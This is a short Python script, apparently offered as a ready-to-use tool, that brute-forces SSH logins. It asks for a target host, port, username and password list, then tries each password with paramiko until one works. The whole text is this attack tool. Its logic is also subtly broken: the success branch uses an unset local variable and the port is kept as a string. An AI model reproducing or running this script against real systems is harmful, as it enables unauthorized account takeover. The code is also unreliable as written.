#!/usr/bin/env python3
# ssh_bruteforce.py
"""SSH bruteforce script (Python3)"""

import os
import sys
import socket
import paramiko


def ssh_connect(passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=user, password=passwd)
    except paramiko.AuthenticationException:
        # authentication failure
        flag = 1
    except socket.error:
        # connection failure, host is down
        flag = 2

    ssh.close()
    return flag


global host, port, user, passlist, file, flag
flag = 0

try:
    host = input('[+] Enter Target Host Address : ')
    port = input('[+] Enter port for SSH connection : ')
    user = input('[+] Enter username(login) : ')
    passlist = input('[+] Enter path for passwords list : ')
    if os.path.exists(passlist) is False:
        print('\n[!] File does not exists.')
        sys.exit(0)
    else:
        file = open(passlist, 'r')
except KeyboardInterrupt:
    print('\n[!] Exiting...')
    sys.exit(0)

for i in file.readlines():
    passwd = i.strip('\n')
    try:
        out = ssh_connect(passwd)
        if out == 0:
            print('----------------------------------------------------------')
            print('[!] SSH Bruteforce Successful... password found.')
            print('[+] Username : {0} | Password : {1}\n'.format(user, passwd))
            print('----------------------------------------------------------')
            sys.exit(0)
        elif out == 1:
            print('[*]Trying password... {0} - Authentication Failed !'.format(passwd))
        else:
            print('[!] Error - Connection could not be established to address :', host)
            sys.exit(0)
    except TypeError:
        print('[!] Exiting...')

file.close()
